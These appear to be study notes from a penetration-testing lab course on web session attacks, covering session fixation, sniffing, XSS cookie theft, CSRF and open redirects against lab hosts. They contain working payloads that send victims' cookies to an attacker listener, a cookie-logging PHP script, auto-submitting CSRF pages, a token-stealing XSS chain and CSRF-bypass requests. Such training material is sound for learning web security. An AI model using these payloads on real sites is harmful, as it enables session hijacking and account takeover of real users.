HTTP is a stateless communication protocol, and as such, any request-response transaction is unrelated to other transactions. This means that each request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only.

For the reason above, web applications utilize cookies, URL parameters, URL arguments (on GET requests), body arguments (on POST requests), and other proprietary solutions for session tracking and management purposes.

# Session ID or token

A unique session identifier (Session ID) or token is the basis upon which user sessions are generated and distinguished.

We should clarify that if an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web application.

An attacker can obtain a session identifier through a multitude of techniques, not all of which include actively attacking the victim. A session identifier can also be:
- Captured through passive traffic/packet sniffing;
- Identified in logs;
- Predicted;
- Brute forced.

A session identifier's security level depends on its:

- Validity scope: (a secure session identifier should be valid for one session only);
- Randomness: (a secure session identifier should be generated through a robust random number/string generation algorithm so that it cannot be predicted);
- Validity time: (a secure session identifier should expire after a certain amount of time).


A session identifier's security level also depends on the location where it is stored:

- URL: If this is the case, the HTTP Referer header can leak a session identifier to other websites. In addition, browser history will also contain any session identifier stored in the URL;
- HTML: If this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies;
- sessionStorage: SessionStorage is a browser storage feature introduced in HTML5. Session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open. In other words, sessionStorage data gets cleared when the page session ends. Note that a page session survives over page reloads and restores;
- localStorage: LocalStorage is a browser storage feature introduced in HTML5. Session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user. This is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed.

# Session hijacking

In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.

An attacker can obtain a victim's session identifier using several methods, with the most common being:
- Passive traffic sniffing;
- Cross-site scripting (XSS);
- Browser history or log-diving;
- Read access to a database containing session information.

As mentioned in the previous section, if a session identifier's security level is low, an attacker may also be able to brute force it or even predict it.

# Session fixation

Session Fixation occurs when an attacker can fixate a (valid) session identifier. As you can imagine, the attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack (since the session identifier is already known).

Such bugs usually occur when session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data (more on that in a bit).

Session Fixation attacks are usually mounted in three stages:

#### Stage 1: Attacker manages to obtain a valid session identifier

Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. This also means that an attacker can be assigned a valid session identifier without having to authenticate.

An attacker can also obtain a valid session identifier by creating an account on the targeted application (if this is a possibility).

#### Stage 2: Attacker manages to fixate a valid session identifier

The above is expected behavior, but it can turn into a session fixation vulnerability if:

- The assigned session identifier pre-login remains the same post-login **and**;
- Session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data and propagated to the application.

If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a session identifier, then the attacker can fixate a session.

#### Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier

All the attacker has to do is craft a URL and lure the victim into visiting it. If the victim does so, the web application will then assign this session identifier to the victim.

The attacker can then proceed to a session hijacking attack since the session identifier is already known.

### Example of session fixation

```url
http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
```
The attacker navigating, see a URL like the one above. The token value is a query URL parameter.

Using the developer tools, notice that the application uses a session cookie named PHPSESSID and that the cookie's value is the same as the token parameter's value on the URL.

If any value or a valid session identifier specified in the token parameter on the URL is propagated to the PHPSESSID cookie's value, we are probably dealing with a session fixation vulnerability.

An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known (the attacker fixated it).

# Obtaining session ID without user interaction

Traffic sniffing is something that most penetration testers do when assessing a network's security from the inside. You will usually see them plugging their laptops or Raspberry Pis into available ethernet sockets. Doing so allows them to monitor the traffic and gives them an idea of the traffic going through the network (segment) and the services they may attack. Traffic sniffing requires **the attacker and the victim to be on the same local network**.

You may have noticed that we mentioned HTTP traffic. This is because HTTP is a protocol that transfers data unencrypted. Thus if an attacker is monitoring the network, they can catch all kinds of information such as usernames, passwords, and even session identifiers. **This type of information will be more challenging and, most of the time, impossible to obtain if HTTP traffic is encrypted through SSL or IPsec**.


Procedure:
- Start Wireshark: ```sudo -E wireshark```;
- Click on the interface (example "tun0") and then click "start capture";
- Apply the filter to only show HTTP traffic. Write "http" inside the Wireshark filter bar;
- Then go to Edit -> Find packet -> Packet bytes -> select String on thid drop down menu and specify auth-session;
- The cookie can be copied by righ-clicking on a row that contains it, then clicking on Copy and finally clicking "Value";
- Then, by going in the browser and opening the "developer tools" we can set the cookie.


# Obtaining session identifiers post exploitation (Web Server Access)

During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory. Of course, an attacker who has compromised a web server can do more than obtain session data and session identifiers. That said, an attacker may not want to continue issuing commands that increase the chances of getting caught.

Let us look at where **PHP session identifiers are usually stored**.

The entry **session.save_path in PHP.ini specifies where session data will be stored**:

```bash
locate php.ini


cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

In our default configuration case it's /var/lib/php/sessions. Now, please note a victim has to be authenticated for us to view their session identifier. The files an attacker will search for use the name convention ```sess_<sessionID>```.


Now, let us look at where Java session identifiers are stored.

According to the Apache Software Foundation:

"The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate Store nested element. The filename of the default session data file is SESSIONS.ser."


Finally, let us look at where .NET session identifiers are stored.

Session data can be found in:
- The application worker process (aspnet_wp.exe) - This is the case in the InProc Session mode;
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the OutProc Session mode;
- An SQL Server.


# Obtaining session identifiers post-exploitation (database access)

In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions. See an example below.

```sql
show databases;
use project;
show tables;
select * from users;
```

Here we can see the users' passwords are hashed. We could spend time trying to crack these; however, there is also a "all_sessions" table. Let us extract data from that table.

```sql
select * from all_sessions;
select * from all_sessions where id=3;
```

<br>
<br>
<br>
<br>

# XSS for session security

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:

- Session cookies should be carried in all HTTP requests;
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing);


### Example scenario

You can access an account that can be modified. Example, you can modify the email, phone number, country, etc.

In such cases, it is best to use payloads with event handlers like onload or onerror since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like onmouseover.

In one field, let us specify the following payload:
```"><img src=x onerror=prompt(document.domain)>```

We are using document.domain to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks. It should be noted that sandbox escapes exist but are outside the scope of this module.

In the remaining two fields, let us specify the following two payloads:

- ```"><img src=x onerror=confirm(1)>```
- ```"><img src=x onerror=alert(1)>```

The profile was updated successfully. We notice no payload being triggered, though! Often, the payload code is not going to be called/executed until another application functionality triggers it. Let us go to "Share," as it is the only other functionality we have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vulnerability in such a functionality would be ideal from an attacker's perspective.

**Let us now check if HTTPOnly is "off" using Web Developer Tools**.

We can check this by going in the "storage" tab in the "developers tools" and check the "httpOnly" column.

### Obtaining session cookies via XSS

We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.

Let us create a cookie-logging script (save it as log.php) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

This script waits for anyone to request ?c=+document.cookie, and it will then parse the included cookie.

The cookie-logging script can be run as follows. TUN Adapter IP is the tun interface's IP of either Pwnbox or your own VM.

```bash
php -S <VPN/TUN Adapter IP>:8000


PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Another possible payload:

```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

A sample HTTPS>HTTPS payload example can be found below:

```js
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

### Obtaining session cookies via XSS (Netcat)

Instead of a cookie-logging script, we could have also used the venerable Netcat tool.

```js
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Or another possible payload:

```js
<body onload='document.write(`<img src="http://10.10.14.195:8000?cookie=${btoa(document.cookie)}">`);'> <h1>test</h1> </body>
```

```bash
nc -nlvp 8000


listening on [any] 8000 ...
```


By the time you hold your mouse over "test," you should now see the below in your attacking machine.

Please note that the cookie is a Base64 value because we used the btoa() function, which will base64 encode the cookie's value. We can decode it using atob("b64_string") in the Dev Console of Web Developer Tools.

We don't necessarily have to use the window.location() object that causes victims to get redirected. We can use fetch(), which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.

<br>
<br>
<br>
<br>

# Cross site request forgery (CSRF)

Cross-site requests are common in web applications and are used for multiple legitimate purposes.

Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with, leveraging the lack of anti-CSRF security mechanisms. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data.

During CSRF attacks, the attacker does not need to read the server's response to the malicious cross-site request. This means that Same-Origin Policy cannot be considered a security mechanism against CSRF attacks.

**Reminder**: According to Mozilla, the same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. The same-origin policy will not allow an attacker to read the server's response to a malicious cross-site request.

A web application is vulnerable to CSRF attacks when:

- All the parameters required for the targeted request can be determined or guessed by the attacker;
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests.

To successfully exploit a CSRF vulnerability, we need:

- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim;
- The victim to be logged into the application at the time when the malicious cross-site request is issued.

### CSRF example

Fwe have a form where we can modify some parameters about a user profile (email, name, ...). WHere we sent this form we notice that there isn't a anti-CSRF token in the request.

First, create and serve the below HTML page. Save it as notmalicious.html:

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

We can serve the page above from our attacking machine as follows:

```bash
python -m http.server 1337



Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in, open a new tab and visit the page you are serving from your attacking machine http://<VPN/TUN Adapter IP>:1337/notmalicious.html. You will notice that logged in user's profile details will change to the ones we specified in the HTML page we are serving.


# CSRF (GET based)

Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.

In some cases the CSRF token is in clear inside the URL. An attacker on the local network can sniff the abovementioned request.

First, create and serve the below HTML page. Save it as notmalicious_get.html:

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

You can serve the page above from your attacking machine as follows:

```bash
python -m http.server 1337
```


# CSRF (POST based)

The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

Imagine you have access to an account on a platform. After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected to ```/app/delete/<your-email>```

Notice that the email is reflected on the page. Let us try inputting some HTML into the email value, such as:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

If you inspect the source (Ctrl+U), you will notice that our injection happens before a single quote. We can abuse this to leak the CSRF-Token.

Let us first instruct Netcat to listen on port 8000, as follows:

```bash
nc -nlvp 8000


listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim:

```
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

<br>
<br>
<br>
<br>

# XSS and CSRF chaining

Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction. If this is the case, we can try chaining vulnerabilities to get the end result of CSRF.

### Example scenario

You can access the web application with an account. 

Some facts about the application:

- The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it);
- The application's Country field is vulnerable to stored XSS attacks (like we saw in the Cross-Site Scripting (XSS) section).

Malicious cross-site requests are out of the equation due to the same origin/same site protections. We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!

Now it is time to develop the appropriate JavaScript payload to place within the Country field of user's profile.

The payload we should specify can be seen below:

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Let us break things down for you.

Firstly we put the entire script in ```<script>``` tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
```

The script snippet above creates an ObjectVariable called req, which we will be using to generate a request. var req = new XMLHttpRequest(); is allowing us to get ready to send HTTP requests.

```js
req.onload = handleResponse;
```

In the script snippet above, we see the onload event handler, which will perform an action once the page has been loaded. This action will be related to the handleResponse function that we will define later.

```js
req.open('get','/app/change-visibility',true);
```

In the script snippet above, we pass three arguments. get which is the request method, the targeted path /app/change-visibility and then true which will continue the execution.

```js
req.send();
```

The script snippet above will send everything we constructed in the HTTP request.

```js
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
```

The script snippet above defines a function called handleResponse.

```js
var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
```

The script snippet above defines a variable called token, which gets the value of responseText from the page we specified earlier in our request. ```/name="csrf" type="hidden" value="(\w+)"/)[1];``` looks for a hidden input field called csrf and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".

```js
var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
```

The script snippet above constructs the HTTP request that we will send through a XMLHttpRequest object.

```js
changeReq.open('post', '/app/change-visibility', true);
```

In the script snippet above, we change the method from GET to POST. The first request was to move us to the targeted page and the second request was to perform the wanted action.

```js
changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
```

The script snippet above is setting the Content-Type to application/x-www-form-urlencoded.

```js
changeReq.send('csrf='+token+'&action=change');
```

The script snippet above sends the request with one param called csrf having the value of the token variable, which is essentially the victim's CSRF token, and another parameter called action with the value change. These are the two parameters that we noticed while inspecting the targeted request through Burp.


Let us try to make a victim's profile public.

First, submit the full payload to the Country field of user's profile and click "Save". Now, another user (with a "private" profile) who will to the shared Ela Stienen's profile (a name of an example user), will have his/her own profile changed to the visibility public.

<br>
<br>
<br>
<br>

# Exploiting weak CSRF tokens

Often, web applications do not employ very secure or robust token generation algorithms. An example is an application that generates CSRF tokens as follows (pseudocode): ```md5(username)```.

How can we tell if that is the case? We can register an account, look into the requests to identify a CSRF token, and then check if the MD5 hash of the username is equal to the CSRF token's value.

When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as md5(username), sha1(username), md5(current date + username) etc. Please note that you should not spend much time on this, but it is worth a shot.

Example of malicious page:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

For your malicious page to have MD5-hashing functionality, save the below as md5.min.js and place it in the directory where the malicious page resides:

```js
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```

We can serve the page and JavaScript code above from our attacking machine as follows:

```bash
python -m http.server 1337
```

<br>
<br>
<br>
<br>

# Additional CSRF protection bypasses

### Null value

You can try making the CSRF token a null value (empty), for example:

- ```CSRF-Token:```

This may work because sometimes, the check is only looking for the header, and it does not validate the token value. In such cases, we can craft our cross-site requests using a null CSRF token, as long as the header is provided in the request.

### Random CSRF token

Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.

Real:
- ```CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331```

Fake:
- ```CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3```

### Use another session's CSRF token

Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.

Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331.

Log into the second account and change the value of CSRF-Token to 9cfffd9e8e78bd68975e295d1b3d3331 while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks using a token generated through our account that is considered valid across multiple accounts.

### Request Method Tampering

To bypass anti-CSRF protections, we can try changing the request method. From POST to GET and vice versa.

For example, if the application is using POST, try changing it to GET:

```http
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned
```

```http
GET /change_password?new_password=pwned&confirm_new=pwned
```

Unexpected requests may be served without the need for a CSRF token.

### Delete the CSRF token parameter or send a blank token

Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank.

Real Request:
```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

Try:
```http
POST /change_password
POST body:
new_password=qwerty
```

Or:
```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```

### Session fixation > CSRF

Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.

If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.

If this is the case and a session fixation vulnerability exists, an attacker could perform a successful CSRF attack as follows:

Steps:
1. Session fixation;
2. Execute CSRF with the following request:
```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

### Anti-CSRF Protection via the Referrer Header

If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script.

- ```<meta name="referrer" content="no-referrer"```

### Bypass the regex

Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain.

Let us suppose that the Referrer Header is checking for google.com. We could try something like ```www.google.com.pwned.m3```, which may bypass the regex! If it uses its own domain (target.com) as a whitelist, try using the target domain as follows ```www.target.com.pwned.m3```.

You can try some of the following as well:

```www.pwned.m3?www.target.com``` or ```www.pwned.m3/www.target.com```

<br>
<br>
<br>
<br>

# Open redirect

An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality.

In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points. From an attacker's perspective, an open redirect vulnerability can prove extremely useful during the initial access phase since it can lead victims to attacker-controlled web pages through a page that they trust.

Let us take a look at some code:

```php
$red = $_GET['url'];
header("Location: " . $red);
```

In the line of code above, a variable called red is defined that gets its value from a parameter called url. $_GET is a PHP superglobal variable that enables us to access the url parameter value.

The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of red, without any validation. We are facing an Open Redirect vulnerability here.

The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows: ```trusted.site/index.php?url=https://evil.com```

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: ```/login.php?redirect=dashboard```.

Tipically, others are:
- ```?url=```
- ```?link=```
- ```?redirect=```
- ```?redirecturl=```
- ```?redirect_uri=```
- ```?return=```
- ```?return_to=```
- ```?returnurl=```
- ```?go=```
- ```?goto=```
- ```?exit=```
- ```?exitpage=```
- ```?fromurl=```
- ```?fromuri=```
- ```?redirect_to=```
- ```?next=```
- ```?newurl=```
- ```?redir=```

### Open redirect example

First, set up a netcat listener:

```bash
nc -lvnp 1337
```

There is an example URL of the following format:

- ```http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>```

Then edit this URL as following:

- ```http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>```

When the victim enters their email, we notice a connection being made to our listener. The application is indeed vulnerable to Open Redirect. Not only that, but the captured request captured also includes the token!

**Open redirect vulnerabilities are usually exploited by attackers to create legitimate-looking phishing URLs**. As we just witnessed, though, when a redirection functionality involves user tokens (regardless of GET or POST being used), attackers can also exploit open redirect vulnerabilities to obtain user tokens.